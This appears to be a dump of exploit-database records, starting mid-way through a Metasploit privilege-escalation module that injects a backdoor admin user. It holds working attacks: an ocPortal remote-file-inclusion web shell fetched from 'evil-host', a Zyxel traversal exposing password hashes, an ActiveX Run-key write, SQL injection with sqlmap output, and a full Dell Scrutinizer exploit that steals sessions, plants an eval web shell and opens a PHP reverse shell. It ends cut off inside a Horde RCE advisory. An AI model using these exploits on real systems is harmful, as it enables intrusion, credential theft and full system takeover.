return true         end     end          return false   end        def check()     if do_check_internal         Exploit::CheckCode::Appears     else         Exploit::CheckCode::Safe     end   end            # The guts of it...   def exploit        # Some basic setup...     payload_instance.extend(ItsAShell)     factory = ssh_socket_factory               # Do a quick check... well, sort of, just shows info.  We won't stop, just report to user...     do_check_internal()               # We will generate a NEW password and salt.  Then get the relevant hash to inject...     @@the_password = SecureRandom.hex     @@the_password_salt = SecureRandom.hex[0..7]     @@the_password_hash = Digest::MD5.hexdigest @@the_password_salt + @@the_password     vprint_status(""generated- user:haxor4  password:"" + @@the_password + "" salt:"" + @@the_password_salt + "" => hash(md5):"" + @@the_password_hash)       # Get a tempfile on the local system.  Garbage collection will automaticlly kill it off later...     # This is a temp location where we will put the sqlite database so we can work on it on the local machine...     tfilehandle = Tempfile.new('ss.db.')     tfilehandle.close     wfile = tfilehandle.path       #Try to get the ProgramData path from the victim, this is where the SQLite databasae is held...     progdata = session.fs.file.expand_path(""%ProgramData%"")    # client.sys.config.getenv('PROGRAMDATA')     print_status 'Remote %ProgramData% = ' + progdata       # Lets check the file exists, then download from the victim to the local file system...     filecheck = progdata + '\SilverShield\SilverShield.config.sqlite'     fsrc = filecheck     fdes = wfile       print_status 'Try download: ' + fsrc + '  to: ' + fdes     begin       ::Timeout.timeout(5) do             session.fs.file.download_file(fdes, fsrc)       end     rescue ::Exception => e       print_error ""Cannot download #{fsrc} to #{fdes}  #{e.class} : #{e.message}""       print_error ""Does victim even have vulnerable SilverShield installed ?""       fail_with(Failure::Unknown, ""Fail download"")     end       # Try to connect with sqlite locally...     vprint_status 'Trying to open database ' + wfile     db = SQLite3::Database.open wfile       # Remove haxor4 if its already there, just incase by pure chance a user with that name already exists...     vprint_status 'remove user ""haxor4"" if its already in there...'     results = db.execute ""delete from USERS where vcusername='haxor4'""     answer = """"     results.each { |row| answer = answer + row.join(',') }       # Insert the haxor user... we will use this later to connect back in as SYSTEM     vprint_status 'insert user ""haxor4"" with password ""' + @@the_password + '"" into database'     results = db.execute ""INSERT INTO USERS (CUSERID, VCUSERNAME, CSALT,CPASSWORD, VCHOMEDIR, BGETFILE, BPUTFILE, BDELFILE, BMODFILE, BRENFILE, BLISTDIR, BMAKEDIR, BDELDIR, BRENDIR, IAUTHTYPES, BAUTHALL, BALLOWSSH, BALLOWSFTP, BALLOWFWD, BALLOWDAV, IACCOUNTSTATUS, BAUTODISABLE, DTAUTODISABLE, BWINPASSWD, BISADMIN)VALUES(\""{11112222-3333-4444-5555666677778888}\"",\""haxor4\"",\"""" + @@the_password_salt + ""\"",\"""" + @@the_password_hash + ""\"",\""c:\\\"",1,1,1,1,1,1,1,1,1,20,0,1,0,0,0,0,0,-700000.0, 0, 1);""     answer = """"     results.each { |row| answer = answer + row.join(',') }     print_good 'user inserted OK'       # Dump out local port that SilverShield has been configured to listen on at the victim machine...     results = db.execute ""select IPORT from maincfg""     answer = """"     results.each { |row| answer = answer + row.join(',') }     ss_port = answer     print_status ""SilverShield config shows listening on port: "" + ss_port     if (datastore['SS_PORT'] != 0)          ss_port = datastore['SS_PORT'].to_s         print_status ""SS_PORT setting forcing port to "" + ss_port     end     if (ss_port == '')         ss_port = '22'     end       # Dump out local IP that SilverShield has been configured to listen on at the victim machine...     results = db.execute ""select CBINDIP from maincfg""     answer = """"     results.each { |row| answer = answer + row.join(',') }     ss_ip = answer     print_status ""SilverShield config shows listening on local IP: "" + ss_ip     if (datastore['SS_IP'] != '')          ss_ip = datastore['SS_IP']         print_status ""SS_IP setting forcing IP to "" + ss_ip     end     # If the override AND the detection have come up with nothing, then use the default 127.0.0.1     if (ss_ip == '')          ss_ip = '127.0.0.1'     end       # Close the database. Keep it neat     db.close       # Now lets upload this file back to the victim...due to bad folder permissions, we can sneak our bad config back in.  Yay     fdes = filecheck       fsrc = wfile     print_status 'Sending modded file back to victim'      begin       ::Timeout.timeout(5) do             session.fs.file.upload_file(fdes, fsrc)       end     rescue ::Exception => e       print_error ""Cannot upload #{fsrc} to #{fdes}  #{e.class} : #{e.message}""       print_error ""Perhaps this server is not vulnerable or has some other mitigation.""       fail_with(Failure::Unknown, ""Fail upload"")     end     sleep 4   # wait a few seconds... this gives the SilverShield service some time to see the settings have changed.       # Delete the port if its already pointing somewhwere...  This a bit ugly and may generate an error, but I don't care.     client.run_cmd(""portfwd delete -l "" + datastore['PF_PORT'].to_s)       # Forward a local port through to the ssh port on the victim.      client.run_cmd(""portfwd add -l "" + datastore['PF_PORT'].to_s + "" -p "" + ss_port + "" -r "" + ss_ip)       # Now do ssh work and hand off the session to the handler...     exploit_sub    end   end",['6.x'],1
28897,"Microsoft Internet Explorer 7 - MHTML Denial of Service source: https://www.securityfocus.com/bid/20875/info  Microsoft Internet Explorer is prone to a denial-of-service vulnerability. This issue occurs when Internet Explorer attempts to parse certain malformed HTML content.  Successfully exploiting this issue will cause the affected application to crash, denying service to legitimate users.  Internet Explorer 7 is vulnerable to this issue; other versions may also be affected.  Content-Type: text/html;  charset=""windows-1251""  Content-Transfer-Encoding: quoted-printable  Content-Location: about:blank   <iframe name=ifr src="""">",['7'],1
6774,"Hummingbird Deployment Wizard 2008 - Registry Values Creation/Change ------------------------------------------------------------------------------------  Hummingbird Deployment Wizard 2008 (DeployRun.dll) Registry Values Creation/Change  url: http://www.hummingbird.com   Author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://www.shinnai.net   This was written for educational purpose. Use it at your own risk.  Author will be not responsible for any damage.    Info:  DeployRun.dll <= 10.0.0.44    Marked as:  RegKey Safe for Script: False  RegKey Safe for Init: False  Implements IObjectSafety: True  IDisp Safe:  Safe for untrusted: caller,data    IPersist Safe:  Safe for untrusted: caller,data   Vulnerable method:  Sub SetRegistryValueAsString (ByVal Path As String, ByVal v As String)   Tested on Windows XP Professional SP3 full patched, with Internet Explorer 7   There are a lot of dangerous methods, just take a look and... good searching ------------------------------------------------------------------------------------ <object classid='clsid:7F9B30F1-5129-4F5C-A76C-CE264A6C7D10' id='test'></object>  <input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>  <script language='vbscript'>  Sub tryMe   'test.SetRegistryValueAsString ""Existing Registry Path + Existing Registry Key"", ""Value to change""   test.SetRegistryValueAsString ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\YourFavouriteKey"", ""Hello World!""  End Sub </script>  # milw0rm.com [2008-10-17]",['2008'],1
574,"ocPortal 1.0.3 - Remote File Inclusion http://localhost/ocp-103/index.php?req_path=http ://evil-host/    On your evil host you must put scipt funcs.php.  Example of funcs.php if your host doesn't support php.       <?php       $com = $_GET[""com""];       system (""$com"");     ?>      Example of funcs.php if your host support php.       <?php       echo '<?php $com = $_GET[""com""]; system (""$com""); ?>';     ?>      http://localhost/ocp-103/index.php?req_path=http://evil-host/&com=ls   # milw0rm.com [2004-10-13]",['1.0.3'],1
45904,"Zyxel VMG1312-B10D 5.13AAXA.8 - Directory Traversal # Exploit Title: Zyxel VMG1312-B10D 5.13AAXA.8 - Directory Traversal # Date: 2018-11-17 # Exploit Author: numan türle # Vendor Homepage: https://www.zyxel.com/ # Software Link: https://www.zyxel.com/products_services/Wireless-N-VDSL2-4-port-Gateway-with-USB-VMG1312-B10D/ # Tested on: macOS # Fixed firmware: 5.13(AAXA.8)C0  # PoC @modem_gateway = ""192.168.1.1"" // default address  http://@modem_gateway/../../../../../../../../../../../../etc/passwd  here are the contents :  ############################## contents ############################## nobody:x:99:99:nobody:/nonexistent:/bin/false root:zKtrESdI2DPME:0:0:root:/home/root:/bin/sh supervisor:.t7H3bCRtJ6UY:12:12:supervisor:/home/supervisor:/bin/sh admin:avHcRxJLoXvas:21:21:admin:/home/admin:/bin/sh user:AebeEcyKDnOzI:31:31:user:/home/user:/bin/sh",['5.13AAXA.8'],1
7076,"Collabtive 0.4.8 - Cross-Site Scripting / Authentication Bypass / Arbitrary File Upload Collabtive 0.4.8 Multiple Vulnerabilities   Name              Multiple Vulnerabilities in Collabtive  Systems Affected  Collabtive 0.4.8 and possibly earlier versions  Severity          High  Impact (CVSSv2)   High 8/10, vector: (AV:N/AC:L/Au:S/C:P/I:C/A:P)  Vendor            http://collabtive.o-dyn.de/  Advisory          http://www.ush.it/team/ush/hack-collabtive048/adv.txt  Authors           Antonio ""s4tan"" Parata (s4tan AT ush DOT it)                    Francesco ""ascii"" Ongaro (ascii AT ush DOT it)                    Giovanni ""evilaliv3"" Pellerano (evilaliv3 AT                    digitalbullets DOT org)  Date              20080925  I. BACKGROUND  >From the Collabtive web site: ""Collabtive is collaborative software to get your projects done!"".  II. DESCRIPTION  Multiple vulnerabilities exist in Collabtive software.  III. ANALYSIS  Summary:   A) Stored Cross Site Scripting  B) Forceful browsing authentication bypass  C) Arbitrary file upload  A) Stored Cross Site Scripting  A stored XSS vulnerability exists in the ""/admin.php?action=projects"" section.  Once the attacker specifies an XSS attack vector, like ""<script>alert(0);</script>"", as the ""Name"" property of a project then an XSS vulnerability occurs because the projects ""Name"" fields are stored and printed without any filtering.  While the cited section poses limits on the ""Name"" field when reflecting the XSS payload, clicking on the edit link ""/manageproject.php?action=editform&id=<projectId>"" results in a page without limitations on the characters showed thus allowing complete exploitation.  This vulnerability requires administrator authentication.  CSRF+XSS and timing (JS) can be used to successfully exploit this vulnerability in an automated manner.  B) Forceful browsing authentication bypass  An authentication bypass vulnerability exists in ""/admin.php?action=users&mode=added"". Directly pointing to that URL shows an error, however at the bottom of the page there is a web form that permits to create new users with full privileges.  With this vulnerability an attacker without any valid credentials can create a new valid administrator.  Since this vulnerability has been discovered the exploitation prerequisites changed as detailed below:  - A bug fix in the latest version 0.4.8 now requires ""globals on"" in order to exploit this vulnerability.  - In version 0.4.6 instead the vulnerability is exploitable regardless the ""globals"" settings.  C) Arbitrary file upload  It's possible to upload arbitrary files with arbitrary extensions. An attacker that has not already gained Administration privileges using the previously exposed vulnerabilities must be assigned to at least one project.  To upload a file go to ""/managefile.php?action=showproject&id=<projectId>"" and add a new file.  If a file with .php extension is uploaded then the mimetype will be ""php/plain"" and the program will change the extension to .txt in order to prevent exploitation.  This security control can be bypassed changing the mimetype to text/plain, in this way the application will believe that a normal .txt file was uploaded and the extension will not be changed.  The uploaded file resides in ""/files/<projectId>/<filename>_$seed.php"".  An authenticated attacker will simply see the seed (and the complete filename) using the web interface and can directly execute it.  In case of unauthenticated attackers the filename must be guessed. Luckily the make_seed() routine leaks real random proprieties and is only based on the time. $seed can be easily bruteforced using values that are likely to match the return derived by the microtime() of the upload.  private function make_seed() {     list($usec, $sec) = explode(' ', microtime());     $value = (float) $sec + ((float) $usec * 100000);     return $value; }  As easily understandable $seed can be guessed in really few tries. The same vulnerability exists when attaching a file in the ""Messages"" section.  This vulnerability can also be exploited via CSRF.  IV. DETECTION  Collabtive 0.4.8 and possibly earlier versions are vulnerable.  V. WORKAROUND  Proper input validation will fix the vulnerabilities.  VI. VENDOR RESPONSE  No fix available.  VII. CVE INFORMATION  No CVE at this time.  VIII. DISCLOSURE TIMELINE  20080926 Initial vendor contact (No Response) 20081003 Second vendor contact (No Response) 20081010 Third vendor contact 20081010 Vendor response (Fix promised for the end of October) 20081010 Vendor contact to sync disclosure time (No response) 20081110 Advisory released (Fix not available)  IX. CREDIT  Antonio ""s4tan"" Parata, Francesco ""ascii"" Ongaro and Giovanni ""evilaliv3"" Pellerano are credited with the discovery of this vulnerability.  Antonio ""s4tan"" Parata web site: http://www.ictsc.it/ mail: s4tan AT ictsc DOT it, s4tan AT ush DOT it  Francesco ""ascii"" Ongaro web site: http://www.ush.it/ mail: ascii AT ush DOT it  Giovanni ""evilaliv3"" Pellerano mail: evilaliv3 AT digitalbullets DOT org  X. LEGAL NOTICES  Copyright (c) 2008 Francesco ""ascii"" Ongaro  Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without mine express written consent. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission.  Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  # milw0rm.com [2008-11-10]","['0.4.8', 'earlier versions']",1
43908,"PACSOne Server 6.6.2 DICOM Web Viewer - SQL Injection # Exploit Title: PACSOne Server 6.6.2 DICOM Web Viewer SQL Injection # Date: 08/14/2017 # Software Link: http://www.pacsone.net/download.htm # Version: PACSOne Server 6.6.2 # Exploit Author: Carlos Avila # Google Dork: inurl:pacs/login.php	inurl:pacsone/login.php		inurl:pacsone filetype:php home		inurl:pacsone filetype:php login # Category: webapps # Tested on: Windows 7 / Debian Linux # Contact: http://twitter.com/badboy_nt  1. Description    DICOM Web Viewer is a component written in PHP. In version 6.6.2, it is vulnerable to SQL Injection. This allows unauthenticated remote attacker to execute arbitrary SQL commands and obtain private information. Admin credentials aren't required. The 'username' and 'email' parameters via POST are vulnerable.  Found: 08/14/2017 Last Vendor Reply & Fix: 09/28/2017    2. Proof of Concept   POST /pacs/userSignup.php HTTP/1.1 Host: 192.168.6.105 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:54.0) Gecko/20100101 Firefox/54.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded Content-Length: 206 Referer: http://192.168.6.105/pacs/userSignup.php?hostname=localhost&database=dicom Cookie: PHPSESSID=k0ggg80jcl6m61nrmp12esvat2 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1  hostname=localhost&database=dicom&username=test&password=22222222&firstname=test&lastname=test&email=test&action=Sign+Up   root@kali18:~# sqlmap -r pacsone_local -v 2 -f -p email --dbms mysql –dbs  web server operating system: Windows web application technology: Apache 2.4.23, PHP 5.6.25 back-end DBMS: active fingerprint: MySQL >= 5.5.0                comment injection fingerprint: MySQL 5.7.14                html error message fingerprint: MySQL [20:09:33] [INFO] fetching database names [20:09:33] [INFO] the SQL query used returns 2 entries [20:09:33] [INFO] retrieved: information_schema [20:09:33] [INFO] retrieved: dicom [20:09:33] [DEBUG] performed 3 queries in 0.11 seconds available databases [2]: [*] dicom [*] information_schema   3. Solution:  Application inputs must be validated correctly.",['6.6.2'],1
39783,"Dell SonicWALL Scrutinizer 11.0.1 - setUserSkin/deleteTab SQL Injection Remote Code Execution #!/usr/local/bin/python """""" Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQL Injection Remote Code Execution sonic.py by mr_me@offensive-security.com greets to @brandonprry ;->  Summary: ========  This exploits an pre-auth SQL Injection in the login.php script within an update statement to steal session data. You could also steal login creds  which require absolutely no hash cracking since the target uses symmetric encryption. It then exploits a second post-auth SQL Injection vulnerability  that writes a shell to the target using a relative path and gets SYSTEM.  Vulnerability: ==============  In html/d4d/login.php on lines 27-34:      }else if ($_REQUEST['setSkin']){         echo setUserSkin(           array(             'db' => $db,             'user_id' => $_REQUEST['user_id'],             'skin' => $_REQUEST['setSkin']           )         );   Then, on lines 46-62:   function setUserSkin($args){     $db = $args['db'];          $result = $db->query("" UPDATE plixer.userpreferences SET setting = '$args[skin]' WHERE prefCode = 'skin' AND users_id = $args[user_id]"");          if ($args['user_id'] == 1){         $result2 = $db->query("" UPDATE plixer.serverprefs SET currentVal = '$args[skin]' WHERE langKey = 'skin'"");     }      }  For the post-auth bug, see https://gist.github.com/brandonprry/76741d9a0d4f518fe297  Example: ========  saturn:module-03 mr_me$ ./sonic.py  	Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t 	mr_me@offensive-security.com  (!) usage: ./poc.py <target> <connectback:port> saturn:module-03 mr_me$ ./poc.py 172.16.175.147 172.16.175.1:1111  	Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t 	mr_me@offensive-security.com  (+) target is vuln, proceeding (+) waiting for session data... starting at: 2016-05-06 16:31:37.022818 (+) awesome, appears like someone has logged in...  (+) it took 0:00:05.020670 to detect valid session data (+) extracting session data... 1:NfS5yetP49TXCqP5 (+) backdooring target... (+) starting handler on port 1111 (+) connection from 172.16.175.147 (+) pop thy shell! whoami nt authority\system ipconfig  Windows IP Configuration   Ethernet adapter Local Area Connection:     Connection-specific DNS Suffix  . : localdomain    IP Address. . . . . . . . . . . . : 172.16.175.147    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 172.16.175.2 *** Connection closed by remote host *** """""" import re import sys import requests import datetime import socket import telnetlib import email.utils as eut from threading import Thread from base64 import b64encode as b64e  lower_value = 0 upper_value = 126  def banner(): 	return """"""\n\tDell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t\n\tmr_me@offensive-security.com\n""""""  def ct(): 	return datetime.datetime.now()  def parsedate(text):     return datetime.datetime(*eut.parsedate(text)[:6])  def check_args():     global target, lserver, lport     if len(sys.argv) < 3:         return False     cb = sys.argv[2]     target = ""http://%s"" % sys.argv[1]     if not "":"" in cb:     	return False     if not cb.split("":"")[1].isdigit():     	return False     lserver = cb.split("":"")[0]     lport   = int(cb.split("":"")[1])     return True  def validate():     r = requests.get(""%s/index.html"" % target)     if re.search('Scrutinizer 11.0.1', r.text):         return True     return False  def have_sessions(time):     """"""     check if we have sessions     """"""   	     sqli = ""if(ascii(substring((select count(session_id) from sessions),1,1))!=48,sleep(%s),null)"" % (time)     url = ""d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s"" % sqli     st = ct()     r = requests.get(""%s/%s"" % (target, url))     delta = ct()-st     if int(delta.seconds) < time:         return False     return True  def do_time_based_blind(sql, time):     lower = lower_value     upper = upper_value     while lower < upper:         try:             mid = (lower + upper) / 2             url = ""%s/%s"" % (target, (""%s>%s,sleep(%s),null)"" % (sql, str(mid), time)))             st = ct()             r = requests.get(url)             delta = ct()-st             if int(delta.seconds) >= time:                 lower = mid + 1             else:                 upper = mid         except (KeyboardInterrupt, SystemExit):             raise         except:             pass       if lower > lower_value and lower < upper_value:         value = lower     else:         url = ""%s/%s"" % (target, (""%s=%s,sleep(%s),null)"" % (sql, str(lower), time)))         st = ct()         r = requests.get(url)         delta = ct()-st         if int(delta.seconds) >= time:             value = lower     return value  def steal_session_length():     xlen = """"     sqli    = ""if(ascii(substring((select length(length(concat(user_id,0x3a,session_id))) from sessions limit 0,1),1,1))""     qry_str = ""d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s"" % sqli     zlen = int(chr(do_time_based_blind(qry_str, 5)))     for i in range(0, zlen):         sqli = ""if(ascii(substring((select length(concat(user_id,0x3a,session_id)) from sessions limit 0,1),%d,1))"" % (i+1)         qry_str = ""d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s"" % sqli         xlen += chr(do_time_based_blind(qry_str, 5))     return int(xlen)  def steal_session(length, time):     session = """"     for i in range(0, length):         sqli    = ""if(ascii(substring((select concat(user_id,0x3a,session_id) from sessions limit 0,1),%d,1))"" % (i+1)         qry_str = ""d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s"" % sqli         char = chr(do_time_based_blind(qry_str, 5))     	session += char     	sys.stdout.write(char)     	sys.stdout.flush()      return session  # build the reverse php shell def build_php_code():     phpkode  = (""""""     @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);"""""")     phpkode += (""""""$dis=@ini_get('disable_functions');"""""")     phpkode += (""""""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);"""""")     phpkode += (""""""$dis=array_map('trim', $dis);}else{$dis=array();} """""")     phpkode += (""""""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """""")     phpkode += (""""""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c."" 2>&1\\n"";} """""")     phpkode += (""""""$imARhD='is_callable';$kqqI='in_array';"""""")     phpkode += (""""""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');"""""")     phpkode += (""""""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """""")     phpkode += (""""""$o.=fread($fp,1024);}}@pclose($fp);}else"""""")     phpkode += (""""""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """""")     phpkode += (""""""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """""")     phpkode += (""""""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """""")     phpkode += (""""""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """""")     phpkode += (""""""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """""")     phpkode += (""""""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """""")     phpkode += (""""""$o=ob_get_contents();ob_end_clean(); """""")     phpkode += (""""""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """""")     phpkode += (""""""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """""")     phpkode += (""""""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """""")     phpkode += (""""""$nofuncs='no exec functions'; """""")     phpkode += (""""""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """""")     phpkode += (""""""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """""" % (lserver, lport))     phpkode += (""""""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """""")     phpkode += (""""""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """""")     phpkode += (""""""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """""")     phpkode += (""""""break;}}fwrite($s,$out);}fclose($s);}else{ """""")     phpkode += (""""""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """""" % (lserver, lport))     phpkode += (""""""@socket_write($s,""socket_create"");while($c=@socket_read($s,2048)){ """""")     phpkode += (""""""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """""")     phpkode += (""""""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """""")     phpkode += (""""""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """""")     phpkode += (""""""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """""")     phpkode += (""""""}@socket_close($s);} """""")     return phpkode  def kill_shot(stolen_data):     user_id    = stolen_data.split("":"")[0]     sessionid = stolen_data.split("":"")[1]     url = ""d4d/dashboards.php?deleteTab=1 union select '<?php eval(base64_decode($_COOKIE[\\'awae\\'])); ?>' into outfile '../../html/d4d/offsec.php'""     requests.get(""%s/%s"" % (target, url), cookies={""userid"": user_id, ""sessionid"": sessionid})  def exec_code():     phpkodez = b64e(build_php_code())     handlerthr = Thread(target=handler, args=(lport,))     handlerthr.start()     requests.get(""%s/d4d/offsec.php"" % (target), cookies={""awae"": phpkodez})  def handler(lport):     print ""(+) starting handler on port %d"" % lport     t = telnetlib.Telnet()     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     s.bind((""0.0.0.0"", lport))     s.listen(1)     conn, addr = s.accept()     print ""(+) connection from %s"" % addr[0]     t.sock = conn     print ""(+) pop thy shell!""     t.interact()  def main():     if check_args():         if validate():             print ""(+) target is vuln, proceeding""             st = ct()             print ""(+) waiting for session data... starting at: %s"" % ct()             # we dont use recursion since we could get stack exhaustion.              while not have_sessions(5):             	pass             print ""(+) awesome, appears like someone has logged in... ""             print ""(+) it took %s to detect valid session data"" % (ct()-st)             sys.stdout.flush()              sys.stdout.write(""(+) extracting session data... "")             dataz = steal_session(steal_session_length(), 5)             print ""\n(+) backdooring target...""             kill_shot(dataz)             exec_code()     else:     	print ""(!) usage: %s <target> <connectback:port>"" % sys.argv[0]  if __name__ == ""__main__"":     print banner()     main()",['11.0.1'],1
41864,"Horde Groupware Webmail 3/4/5 - Multiple Remote Code Executions Source: https://blogs.securiteam.com/index.php/archives/3107  Vulnerabilities Summary The following advisory describes two (2) vulnerabilities found in Horde Groupware Webmail.  Horde Groupware Webmail Edition is a free, enterprise ready, browser based communication suite. Users can read, send and organize email messages and manage and share calendars, contacts, tasks, notes, files, and bookmarks with the standards compliant components from the Horde Project. Horde Groupware Webmail Edition bundles the separately available applications IMP, Ingo, Kronolith, Turba, Nag, Mnemo, Gollem, and Trean.  It can be extended with any of the released Horde applications or the applications that are still in development, like a bookmark manager or a file manager.  Affected versions: Horde 5, 4 and 3  The vulnerabilities found in Horde Groupware Webmail are:  Authentication Remote Code Execution Unauthentication Remote Code Execution  Credit An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.  Vendor response Horde has released a patch to address the vulnerabilities.  For more information: https://lists.horde.org/archives/horde/Week-of-Mon-20170403/056767.html  Vulnerabilities Details  Authentication Remote Code Execution Horde Webmail contains a vulnerability that allows a remote attacker to execute arbitrary code with the privileges of the user who runs the web server.  For successful attack GnuPG feature should be enabled on the target server (path to gpg binary should be defined in $conf[gnupg][path] setting).  Vulnerable code: encryptMessage() function of GPG feature.  Path: /Horde/Crypt/Pgp/Backend/Binary.php:  /* 416 */ public function encryptMessage($text, $params) /* 417 */ { /* … */ /* 435 */ foreach (array_keys($params['recips']) as $val) { /* 436 */ $cmdline[] = '--recipient ' . $val; #! vulnerable code /* … */ /* 444 */ /* Encrypt the document. */ /* 445 */ $result = $this->_callGpg( /* 446 */ $cmdline, /* 447 */ 'w', /* 448 */ empty($params['symmetric']) ? null : $params['passphrase'], /* 449 */ true, /* 450 */ true /* 451 */ );  $params[‘recips’] will be added to $cmdline array and passed to _callGpg():  Path: /Horde/Crypt/Pgp/Backend/Binary.php:  /* 642 */ public function _callGpg( /* 643 */ $options, $mode, $input = array(), $output = false, $stderr = false, /* 644 */ $parseable = false, $verbose = false /* 645 */ ) /* 646 */ { /* … */ /* 675 */ $cmdline = implode(' ', array_merge($this->_gnupg, $options)); /* … */ /* 681 */ if ($mode == 'w') { /* 682 */ if ($fp = popen($cmdline, 'w')) {                        #! vulnerable code /* … */  We can see that our recipients (addresses) will be in command line that is going to be executed. encryptMessage() function can be reached by various API, requests. For example it will be called when user try to send encrypted message.  Our request for encryption and sending our message will be processed by buildAndSendMessage() method: Path: /imp/lib/Compose.php  /* 733 */ public function buildAndSendMessage( /* 734 */ $body, $header, IMP_Prefs_Identity $identity, array $opts = array() /* 735 */ ) /* 736 */ { /* 737 */ global $conf, $injector, $notification, $prefs, $registry, $session; /* 738 */ /* 739 */ /* We need at least one recipient & RFC 2822 requires that no 8-bit /* 740 */ * characters can be in the address fields. */ /* 741 */ $recip = $this->recipientList($header); /* ... */ /* 793 */ /* Must encrypt & send the message one recipient at a time. */ /* 794 */ if ($prefs->getValue('use_smime') && /* 795 */ in_array($encrypt, array(IMP_Crypt_Smime::ENCRYPT, IMP_Crypt_Smime::SIGNENC))) { /* ... */ /* 807 */ } else { /* 808 */ /* Can send in clear-text all at once, or PGP can encrypt /* 809 */ * multiple addresses in the same message. */ /* 810 */ $msg_options['from'] = $from; /* 811 */ $save_msg = $this->_createMimeMessage($recip['list'], $body, $msg_options);        #! vulnerable code  In line 741 it tries to create recipient list: Horde parsers values of ‘to’, ‘cc’, ‘bcc’ headers and creates list of Rfc822 addresses. In general there are restrictions for characters in addresses but if we will use the next format:  display-name <""somemailbox""@somedomain.com>  somemailbox will be parsed by _rfc822ParseQuotedString() method:  Path: /Horde/Mail/Rfc822.php:  /* 557 */ protected function _rfc822ParseQuotedString(&$str) /* 558 */ { /* 559 */ if ($this->_curr(true) != '""') { /* 560 */ throw new Horde_Mail_Exception('Error when parsing a quoted string.'); /* 561 */ } /* 563 */ while (($chr = $this->_curr(true)) !== false) { /* 564 */ switch ($chr) { /* 565 */ case '""': /* 566 */ $this->_rfc822SkipLwsp(); /* 567 */ return; /* 569 */ case ""\n"": /* 570 */ /* Folding whitespace, remove the (CR)LF. */ /* 571 */ if (substr($str, -1) == ""\r"") { /* 572 */ $str = substr($str, 0, -1); /* 573 */ } /* 574 */ continue; /* 576 */ case '\\': /* 577 */ if (($chr = $this->_curr(true)) === false) { /* 578 */ break 2; /* 579 */ } /* 580 */ break; /* 581 */ } /* 583 */ $str .= $chr; /* 584 */ } /* 586 */ /* Missing trailing '""', or partial quoted character. */ /* 587 */ throw new Horde_Mail_Exception('Error when parsing a quoted string.'); /* 588 */ }  There are only a few limitations:  we cannot use “ \n will be deleted we cannot use \ at the end of our mailbox  After creation of recipient list buildAndSendMessage() will call _createMimeMessage():  Path: /imp/lib/Compose.php  /* 1446 */ protected function _createMimeMessage( /* 1447 */ Horde_Mail_Rfc822_List $to, $body, array $options = array() /* 1448 */ ) /* 1449 */ { /* 1450 */ global $conf, $injector, $prefs, $registry; /* ... */ /* 1691 */ /* Set up the base message now. */ /* 1692 */ $encrypt = empty($options['encrypt']) /* 1693 */ ? IMP::ENCRYPT_NONE /* 1694 */ : $options['encrypt']; /* 1695 */ if ($prefs->getValue('use_pgp') && /* 1696 */ !empty($conf['gnupg']['path']) && /* 1697 */ in_array($encrypt, array(IMP_Crypt_Pgp::ENCRYPT, IMP_Crypt_Pgp::SIGN, IMP_Crypt_Pgp::SIGNENC, IMP_Crypt_Pgp::SYM_ENCRYPT, IMP_Crypt_Pgp::SYM_SIGNENC))) { /* 1698 */ $imp_pgp = $injector->getInstance('IMP_Crypt_Pgp'); /* ... */ /* 1727 */ /* Do the encryption/signing requested. */ /* 1728 */ try { /* 1729 */ switch ($encrypt) { /* ... */ /* 1735 */ case IMP_Crypt_Pgp::ENCRYPT: /* 1736 */ case 